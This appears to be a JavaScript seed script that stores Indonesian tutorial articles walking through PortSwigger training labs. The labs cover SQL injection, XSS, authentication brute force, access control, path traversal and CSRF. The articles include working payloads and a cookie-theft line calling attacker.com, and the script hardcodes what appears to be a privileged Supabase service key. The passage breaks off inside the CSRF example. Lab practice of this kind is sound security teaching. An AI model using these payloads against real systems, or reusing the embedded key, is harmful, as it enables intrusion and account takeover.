const { createClient } = require("../node_modules/@supabase/supabase-js");
const supabase = createClient(
  "https://lpzjaorzhxqespuojsjo.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imxwemphb3J6aHhxZXNwdW9qc2pvIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3Nzg1OTMwMiwiZXhwIjoyMDkzNDM1MzAyfQ.JstoOavT0dmEIErayl6p-I8BhymJbJCZ2_ShNFl2_qE"
);

const codeBlock = (code, color = "#A8FF78") =>
  `<pre style="background:#1E1E1E;color:${color};padding:0.75rem 1rem;border-radius:8px;font-size:0.85rem;overflow-x:auto;margin:0.4rem 0 0.75rem;">${code}</pre>`;

const card = (content) =>
  `<div style="border:1px solid #F0E8D8;border-radius:12px;padding:1.2rem;margin:0.75rem 0;">${content}</div>`;

const note = (content, color = "#F0F7E8", border = "#7AB648") =>
  `<div style="background:${color};border-left:4px solid ${border};padding:0.7rem 0.9rem;border-radius:0 8px 8px 0;margin:0.75rem 0;"><p style="margin:0;font-size:0.85rem;">${content}</p></div>`;

const TARGET_BOX = (url, desc) => `
<div style="background:#1E1E1E;border-radius:12px;padding:1rem 1.2rem;margin-bottom:1.5rem;">
  <p style="margin:0 0 0.3rem;font-size:0.8rem;color:#888;">🎯 PLATFORM LATIHAN</p>
  <p style="margin:0;font-size:0.95rem;font-weight:800;color:#A8FF78;font-family:monospace;">${url}</p>
  <p style="margin:0.3rem 0 0;font-size:0.78rem;color:#666;">${desc}</p>
</div>`;

const labHeader = (num, title, difficulty = "Beginner") => {
  const colors = { Beginner: "#7AB648", Intermediate: "#F5A62A", Advanced: "#E53935" };
  const bg = colors[difficulty] || "#7AB648";
  return `<div style="display:flex;align-items:center;gap:0.75rem;margin:1.5rem 0 0.75rem;">
<span style="flex-shrink:0;background:#2D5016;color:white;font-size:0.75rem;font-weight:800;padding:0.3rem 0.6rem;border-radius:6px;">Lab ${num}</span>
<p style="margin:0;font-weight:800;color:#2D5016;font-size:0.95rem;">${title}</p>
<span style="margin-left:auto;background:${bg};color:white;font-size:0.72rem;font-weight:700;padding:0.15rem 0.5rem;border-radius:6px;">${difficulty}</span>
</div>`;
};

const articles = [

// ── B1: SQL Injection Labs ────────────────────────────────────────────────
{
  title: "🧪 B1 — SQL Injection Labs Walkthrough (3 Lab)",
  module_index: 8,
  order_index: 0,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🧪 B1 — SQL Injection Labs Walkthrough</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Bonus walkthrough — tiga lab PortSwigger SQL Injection step by step. Ikuti setiap langkah dan pahami kenapa payload berhasil.</p>
${TARGET_BOX("portswigger.net/web-security/sql-injection", "Butuh akun gratis PortSwigger. Klik 'Access the lab' di setiap lab — tidak perlu install apapun.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

${labHeader(1, "SQL injection in WHERE clause — Retrieve hidden data", "Beginner")}
${card(`<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan:</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">Tampilkan semua produk termasuk yang belum dipublikasi.</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Query asli di balik layar:</p>
${codeBlock(`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`, "#FFD700")}
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Langkah-langkah:</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Akses lab → klik kategori "Gifts" → perhatikan URL: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/filter?category=Gifts</code></li>
<li style="margin-bottom:0.4rem;">Ubah URL jadi:<br/>${codeBlock(`/filter?category=Gifts'--`)}<br/>Produk tersembunyi muncul — <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">AND released=1</code> diabaikan oleh comment <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">--</code></li>
<li style="margin-bottom:0.4rem;">Tampilkan SEMUA produk dari semua kategori:<br/>${codeBlock(`/filter?category='+OR+1=1--`)}</li>
<li>Lab solved ✓</li>
</ol>
${note("💡 <strong>Kenapa berhasil:</strong> <code>OR 1=1</code> selalu bernilai true — semua baris di tabel memenuhi kondisi WHERE. <code>--</code> adalah comment MySQL yang membuat sisa query diabaikan.", "#F0F7E8", "#7AB648")}`)}

${labHeader(2, "SQL injection — Login bypass", "Beginner")}
${card(`<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan:</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">Login sebagai administrator tanpa mengetahui passwordnya.</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Query login asli:</p>
${codeBlock(`SELECT * FROM users WHERE username='input' AND password='input'`, "#FFD700")}
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Langkah-langkah:</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Buka halaman login → isi field <strong>Username</strong>:<br/>${codeBlock(`administrator'--`)}</li>
<li style="margin-bottom:0.4rem;">Field <strong>Password</strong>: ketik sembarang, misalnya <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">apapun</code></li>
<li style="margin-bottom:0.4rem;">Klik Login → masuk sebagai administrator ✓</li>
</ol>
<p style="margin:0.75rem 0 0;font-size:0.87rem;font-weight:700;color:#2D5016;">Query yang dieksekusi setelah inject:</p>
${codeBlock(`SELECT * FROM users WHERE username='administrator'--' AND password='apapun'`, "#FFD700")}
<p style="margin:0;font-size:0.82rem;color:#666;">Bagian <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">AND password=...</code> sepenuhnya diabaikan. Server menemukan user administrator, login berhasil.</p>`)}

${labHeader(3, "SQL injection UNION attack — Determine number of columns", "Intermediate")}
${card(`<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan:</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">Tentukan jumlah kolom yang dikembalikan oleh query menggunakan UNION attack.</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;"><strong>UNION attack</strong> memungkinkan kita menggabungkan hasil query kedua ke dalam query asli. Syarat: jumlah kolom harus identik.</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Step 1 — Tentukan jumlah kolom dengan ORDER BY:</p>
${codeBlock(`/filter?category=Gifts' ORDER BY 1--    → OK (tidak error)
/filter?category=Gifts' ORDER BY 2--    → OK
/filter?category=Gifts' ORDER BY 3--    → OK
/filter?category=Gifts' ORDER BY 4--    → ERROR → berarti ada 3 kolom`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Step 2 — Konfirmasi dengan UNION NULL:</p>
${codeBlock(`/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Tidak ada error = konfirmasi 3 kolom. Lab solved ✓</p>
<p style="margin:0.5rem 0 0;font-size:0.82rem;color:#666;"><strong>Bonus:</strong> Setelah tahu jumlah kolom, kamu bisa ambil data dari tabel lain:<br/><code style="background:#1E1E1E;color:#A8FF78;padding:0.15rem 0.4rem;border-radius:4px;font-size:0.78rem;">' UNION SELECT username,password,NULL FROM users--</code></p>`)}

${note("🎯 <strong>Next bonus:</strong> B2 — XSS Labs. Empat lab dengan teknik yang makin advanced dari setiap lab.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── B2: XSS Labs ─────────────────────────────────────────────────────────
{
  title: "🧪 B2 — XSS Labs Walkthrough (4 Lab)",
  module_index: 8,
  order_index: 1,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🧪 B2 — XSS Labs Walkthrough</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Bonus walkthrough — empat lab XSS dari yang paling basic sampai bypassing HTML encoding. Setiap lab butuh pendekatan yang berbeda.</p>
${TARGET_BOX("portswigger.net/web-security/cross-site-scripting", "Butuh akun gratis PortSwigger. Labs berjalan di browser tanpa install apapun.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

${labHeader(1, "Reflected XSS into HTML context with nothing encoded", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Jalankan <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">alert()</code> via Reflected XSS.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Akses lab → ada search box</li>
<li style="margin-bottom:0.4rem;">Ketik sembarang teks → lihat teks muncul di halaman (di-reflect)</li>
<li style="margin-bottom:0.4rem;">Ketik payload ini di search box:<br/>${codeBlock(`<script>alert(1)</script>`)}</li>
<li>Enter → popup alert muncul → Lab solved ✓</li>
</ol>
${note("💡 Tidak ada filter atau encoding. Input langsung masuk ke HTML — apapun yang kamu ketik dieksekusi oleh browser.", "#F0F7E8", "#7AB648")}`)}

${labHeader(2, "Stored XSS into HTML context with nothing encoded", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Sisipkan XSS payload yang tersimpan di database dan dieksekusi setiap halaman dimuat.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Akses lab → buka blog post → temukan form komentar</li>
<li style="margin-bottom:0.4rem;">Isi field <strong>Comment</strong>:<br/>${codeBlock(`<script>alert(document.cookie)</script>`)}</li>
<li style="margin-bottom:0.4rem;">Field Name, Email, Website: isi dengan nilai sembarang yang valid</li>
<li style="margin-bottom:0.4rem;">Submit → kamu diredirect ke blog post</li>
<li>Popup muncul menampilkan cookie session → Lab solved ✓</li>
</ol>
${note("⭐ Ini lebih berbahaya dari Reflected — siapapun yang buka halaman ini akan mendapat popup. Cookie mereka bisa dicuri dengan mengganti <code>alert()</code> dengan <code>fetch('https://attacker.com?c='+document.cookie)</code>.", "#FFF3D6", "#F5A62A")}`)}

${labHeader(3, "DOM XSS in document.write sink using source location.search", "Intermediate")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Eksploitasi DOM-based XSS di JavaScript client-side.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Akses lab → buka DevTools (F12) → tab Sources → lihat JavaScript halaman</li>
<li style="margin-bottom:0.4rem;">Temukan kode vulnerable:<br/>${codeBlock(`var query = (new URLSearchParams(location.search)).get('search');
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');`, "#FFD700")}</li>
<li style="margin-bottom:0.4rem;">Input dari URL langsung ke <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">document.write</code> tanpa sanitasi</li>
<li style="margin-bottom:0.4rem;">Di URL bar tambahkan:<br/>${codeBlock(`?search="><svg onload=alert(1)>`)}</li>
<li>Popup muncul → Lab solved ✓</li>
</ol>
<p style="margin:0.5rem 0 0;font-size:0.87rem;font-weight:700;color:#2D5016;">Kenapa <code>"><svg onload=alert(1)></code>?</p>
<p style="margin:0;font-size:0.82rem;color:#666;"><code>"</code> menutup attribute value pada tag img. <code>></code> menutup tag img. <code>&lt;svg onload=alert(1)&gt;</code> adalah tag baru yang dieksekusi browser — tanpa butuh tag &lt;script&gt;.</p>`)}

${labHeader(4, "Reflected XSS into attribute with angle brackets HTML-encoded", "Intermediate")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Bypass HTML encoding pada angle brackets untuk jalankan XSS via event handler.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Akses lab → coba search dengan <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">test"</code> → cek source halaman</li>
<li style="margin-bottom:0.4rem;">Input masuk ke dalam attribute value: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">&lt;input value="test""&gt;</code></li>
<li style="margin-bottom:0.4rem;">Tanda kutip tidak di-encode — kita bisa inject attribute baru</li>
<li style="margin-bottom:0.4rem;">Payload di search box:<br/>${codeBlock(`test" autofocus onfocus="alert(1)`)}</li>
<li style="margin-bottom:0.4rem;">HTML yang dihasilkan:<br/>${codeBlock(`<input value="test" autofocus onfocus="alert(1)">`, "#FFD700")}</li>
<li><code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">autofocus</code> membuat elemen langsung focused saat load → <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">onfocus</code> langsung trigger → Lab solved ✓</li>
</ol>
${note("💡 <strong>Poin kunci:</strong> Kalau <code>&lt;</code> dan <code>&gt;</code> di-encode, cari konteks lain — attribute value, href, JavaScript strings. Setiap konteks punya teknik bypass yang berbeda.", "#F0F7E8", "#7AB648")}`)}

${note("🎯 <strong>Next bonus:</strong> B3 — Authentication Labs. Username enumeration, brute force dengan Burp Intruder, dan broken password reset.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── B3: Authentication Labs ───────────────────────────────────────────────
{
  title: "🧪 B3 — Authentication Labs Walkthrough",
  module_index: 8,
  order_index: 2,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🧪 B3 — Authentication Labs Walkthrough</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Bonus walkthrough — tiga lab authentication. Butuh Burp Suite aktif sebagai proxy untuk lab 1 dan 2.</p>
${TARGET_BOX("portswigger.net/web-security/authentication", "Burp Suite harus dikonfigurasi sebagai proxy browser sebelum mulai Lab 1 dan 2.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

${labHeader(1, "Username enumeration via different responses", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Temukan username valid, lalu brute force passwordnya menggunakan Burp Intruder.</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Phase 1 — Enumerate username:</p>
<ol style="margin:0 0 0.75rem;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Buka Burp Suite → Proxy → Intercept On</li>
<li style="margin-bottom:0.4rem;">Login di lab dengan username acak (<code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">aaaa</code>) dan password acak</li>
<li style="margin-bottom:0.4rem;">Request tertangkap di Burp → klik kanan → Send to Intruder</li>
<li style="margin-bottom:0.4rem;">Tab Positions → clear all (§) → pilih nilai username → Add §</li>
<li style="margin-bottom:0.4rem;">Tab Payloads → load wordlist username dari halaman lab (ada di description)</li>
<li style="margin-bottom:0.4rem;">Start Attack</li>
<li>Filter hasil: response yang berisi "Incorrect password" (bukan "Invalid username") = username valid ✓</li>
</ol>
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Phase 2 — Brute force password:</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Ulangi Intruder attack → kali ini username = yang valid (fixed), wordlist di field password</li>
<li style="margin-bottom:0.4rem;">Start Attack → cari response dengan status 302 (redirect = login berhasil)</li>
<li>Login dengan kombinasi itu → Lab solved ✓</li>
</ol>`)}

${labHeader(2, "Username enumeration via subtly different responses", "Intermediate")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Sama seperti Lab 1, tapi perbedaan response sangat kecil — butuh Grep Extract.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Setup Intruder attack pada field username seperti Lab 1</li>
<li style="margin-bottom:0.4rem;">Sebelum Start Attack → tab Options → <strong>Grep - Extract</strong> → Add</li>
<li style="margin-bottom:0.4rem;">Di dialog Grep Extract, klik Fetch response → highlight teks "Invalid username " (perhatikan spasi di akhir)</li>
<li style="margin-bottom:0.4rem;">Start Attack → di hasil, kolom grep akan <strong>kosong</strong> untuk username yang valid (teks berbeda)</li>
<li style="margin-bottom:0.4rem;">Catat username valid → lanjutkan brute force password seperti Lab 1</li>
<li>Lab solved ✓</li>
</ol>
${note("💡 Server mengembalikan 'Invalid username' (dengan trailing space) untuk username tidak valid, dan 'Invalid username' (tanpa trailing space) untuk valid. Perbedaan 1 karakter yang tidak terlihat di mata tapi terbaca di Burp.", "#FFF3D6", "#F5A62A")}`)}

${labHeader(3, "Password reset broken logic", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Reset password user carlos tanpa tahu token-nya.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Klik "Forgot password" → masukkan email: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">wiener@normal-user.net</code></li>
<li style="margin-bottom:0.4rem;">Buka <strong>Email client</strong> (tersedia di lab) → buka email reset → klik link</li>
<li style="margin-bottom:0.4rem;">Di form reset password, aktifkan Burp Intercept → isi password baru → submit</li>
<li style="margin-bottom:0.4rem;">Intercept request di Burp:<br/>${codeBlock(`username=wiener&new-password-1=test123&new-password-2=test123&temp-forgot-password-token=abc`)}</li>
<li style="margin-bottom:0.4rem;">Ubah <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">username=wiener</code> menjadi <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">username=carlos</code> → Forward</li>
<li style="margin-bottom:0.4rem;">Sekarang password carlos = <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">test123</code></li>
<li>Login sebagai <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">carlos</code> / <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">test123</code> → Lab solved ✓</li>
</ol>
${note("💡 <strong>Root cause:</strong> Token reset divalidasi saat link dibuka, tapi <em>tidak</em> saat form disubmit. Username di request final tidak diverifikasi — siapapun bisa reset password siapapun kalau punya token aktif (bahkan token milik sendiri).", "#F0F7E8", "#7AB648")}`)}

${note("🎯 <strong>Next bonus:</strong> B4 — Access Control Labs. Unprotected admin panel, parameter tampering, dan IDOR.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── B4: Access Control Labs ───────────────────────────────────────────────
{
  title: "🧪 B4 — Access Control Labs Walkthrough",
  module_index: 8,
  order_index: 3,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🧪 B4 — Access Control Labs Walkthrough</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Bonus walkthrough — tiga lab Broken Access Control (A01 OWASP). Kita akses admin panel, manipulasi role, dan curi data lewat IDOR.</p>
${TARGET_BOX("portswigger.net/web-security/access-control", "Butuh akun PortSwigger. Lab 2 butuh Burp Suite aktif sebagai proxy.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

${labHeader(1, "Unprotected admin functionality", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Akses panel admin dan hapus user carlos — tanpa login sebagai admin.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Akses lab → buka <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/robots.txt</code></li>
<li style="margin-bottom:0.4rem;">Isi robots.txt:<br/>${codeBlock(`User-agent: *
Disallow: /administrator-panel`)}</li>
<li style="margin-bottom:0.4rem;">Buka langsung: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/administrator-panel</code></li>
<li style="margin-bottom:0.4rem;">Admin panel terbuka tanpa autentikasi sama sekali</li>
<li>Klik Delete di baris user carlos → Lab solved ✓</li>
</ol>
${note("💡 robots.txt dimaksudkan untuk memberi tahu crawler mana yang jangan diindex. Tapi isinya bisa dibaca siapapun — dan ini malah membocorkan path yang ingin disembunyikan.", "#FFF3D6", "#F5A62A")}`)}

${labHeader(2, "User role controlled by request parameter", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Akses admin panel sebagai user biasa dengan manipulasi cookie.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Login sebagai: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">wiener / peter</code></li>
<li style="margin-bottom:0.4rem;">Buka Burp → Proxy → Intercept On</li>
<li style="margin-bottom:0.4rem;">Browse ke <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/admin</code></li>
<li style="margin-bottom:0.4rem;">Request tertangkap — perhatikan header Cookie:<br/>${codeBlock(`Cookie: Admin=false; session=xxxxxxxxxxxx`)}</li>
<li style="margin-bottom:0.4rem;">Ubah <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">Admin=false</code> → <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">Admin=true</code> → Forward</li>
<li style="margin-bottom:0.4rem;">Admin panel terbuka ✓</li>
<li>Hapus user carlos → Lab solved ✓</li>
</ol>
${note("💡 <strong>Root cause:</strong> Authorization dikontrol di sisi client (cookie yang bisa diubah siapapun), bukan di sisi server. Server hanya percaya nilai cookie yang dikirim browser tanpa memverifikasi.", "#F0F7E8", "#7AB648")}`)}

${labHeader(3, "Insecure direct object references (IDOR)", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Akses transcript milik user lain dan gunakan informasi di dalamnya untuk login sebagai carlos.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Login sebagai: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">wiener / peter</code></li>
<li style="margin-bottom:0.4rem;">Buka fitur <strong>Live chat</strong> → kirim pesan apapun → klik "View transcript"</li>
<li style="margin-bottom:0.4rem;">Browser mendownload file. Perhatikan URL download:<br/>${codeBlock(`/download-transcript/2.txt`)}</li>
<li style="margin-bottom:0.4rem;">Ubah nomor — ganti <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">2</code> menjadi <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">1</code>:<br/>${codeBlock(`/download-transcript/1.txt`)}</li>
<li style="margin-bottom:0.4rem;">Download dan buka file → ada percakapan carlos yang menyebut passwordnya</li>
<li style="margin-bottom:0.4rem;">Logout → Login sebagai <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">carlos</code> dengan password yang ditemukan</li>
<li>Lab solved ✓</li>
</ol>
${note("⭐ IDOR adalah salah satu vulnerability yang paling sering ditemukan di bug bounty. Setiap kali ada angka atau ID di URL, test dengan angka lain. Banyak yang terlupa memproteksi endpoint download.", "#FFF3D6", "#F5A62A")}`)}

${note("🎯 <strong>Next bonus:</strong> B5 — Path Traversal + CSRF. Lab terakhir dari bonus series.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── B5: Path Traversal + CSRF ─────────────────────────────────────────────
{
  title: "🧪 B5 — Path Traversal + CSRF Labs Walkthrough",
  module_index: 8,
  order_index: 4,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🧪 B5 — Path Traversal + CSRF Labs Walkthrough</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Bonus walkthrough terakhir — dua Path Traversal lab dan satu CSRF lab. CSRF lab butuh Burp Suite untuk generate PoC.</p>
${TARGET_BOX("portswigger.net/web-security/file-path-traversal + /csrf", "Lab terakhir dari bonus series. Pastikan Burp Suite aktif untuk lab CSRF.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

${labHeader(1, "Path traversal — Simple case", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Baca isi file <code>/etc/passwd</code> dari server melalui parameter filename yang tidak divalidasi.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Akses lab → klik kanan gambar produk → Inspect Element → salin URL dari attribute <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">src</code></li>
<li style="margin-bottom:0.4rem;">Contoh URL gambar: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/image?filename=53.jpg</code></li>
<li style="margin-bottom:0.4rem;">Buka URL tersebut di tab baru → ubah nilai filename:<br/>${codeBlock(`/image?filename=../../../etc/passwd`)}</li>
<li style="margin-bottom:0.4rem;">Isi file <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/etc/passwd</code> tampil di browser → Lab solved ✓</li>
</ol>
<p style="margin:0.5rem 0 0.3rem;font-size:0.87rem;font-weight:700;color:#2D5016;">Cara kerjanya:</p>
${codeBlock(`Server path asli: /var/www/app/images/53.jpg
Setelah inject:   /var/www/app/images/../../../etc/passwd
Resolusi:         /etc/passwd`, "#FFD700")}`)}

${labHeader(2, "Path traversal — Traversal sequences stripped with superfluous URL-decode", "Intermediate")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Bypass filter yang menghapus <code>../</code> menggunakan double URL encoding.</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Server memfilter <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">../</code> dari input — tapi hanya setelah satu kali URL decode. Kita bisa bypass dengan encode ganda:</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;margin-bottom:0.75rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.4rem 0.7rem;text-align:left;color:#2D5016;">Karakter</th><th style="padding:0.4rem 0.7rem;text-align:left;color:#2D5016;">Encoded</th><th style="padding:0.4rem 0.7rem;text-align:left;color:#2D5016;">Double encoded</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.4rem 0.7rem;">.</td><td style="padding:0.4rem 0.7rem;font-family:monospace;">%2e</td><td style="padding:0.4rem 0.7rem;font-family:monospace;">%252e</td></tr>
<tr style="background:#FAFAF8;"><td style="padding:0.4rem 0.7rem;">/</td><td style="padding:0.4rem 0.7rem;font-family:monospace;">%2f</td><td style="padding:0.4rem 0.7rem;font-family:monospace;">%252f</td></tr>
</tbody></table>
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Payload dengan double encoding:</p>
${codeBlock(`/image?filename=..%252f..%252f..%252fetc/passwd`)}
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Server menerima request → decode pertama: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">..%2f..%2f..%2fetc/passwd</code></li>
<li style="margin-bottom:0.4rem;">Filter cari <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">../</code> → tidak ketemu (masih encoded) → filter tidak memblok</li>
<li style="margin-bottom:0.4rem;">Server decode kedua: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">../../etc/passwd</code> → file dibaca</li>
<li>Isi <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/etc/passwd</code> tampil → Lab solved ✓</li>
</ol>`)}

${labHeader(3, "CSRF vulnerability with no defenses", "Beginner")}
${card(`<p style="margin:0 0 0.75rem;font-size:0.87rem;font-weight:700;color:#666;">Tujuan: Buat halaman HTML berbahaya yang mengubah email korban tanpa mereka sadari (CSRF attack).</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;"><strong>CSRF — Cross-Site Request Forgery</strong>: browser korban dipaksa mengirim request ke website lain yang sudah mereka login, tanpa mereka sadari.</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.4rem;">Login sebagai <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">wiener / peter</code> → buka "Update email"</li>
<li style="margin-bottom:0.4rem;">Aktifkan Burp Intercept → submit form ubah email → request tertangkap:<br/>${codeBlock(`POST /my-account/change-email
email=test%40test.com`)}<br/>Tidak ada CSRF token! Siapapun bisa submit form ini atas nama wiener.</li>
<li style="margin-bottom:0.4rem;">Klik kanan request di Burp → <strong>Engagement tools</strong> → <strong>Generate CSRF PoC</strong></li>
<li style="margin-bottom:0.4rem;">Burp generate HTML — copy semua kodenya:<br/>${codeBlock(`&lt;html&gt;
  &lt;body&gt;
    &lt;form action="https://[lab-url]/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
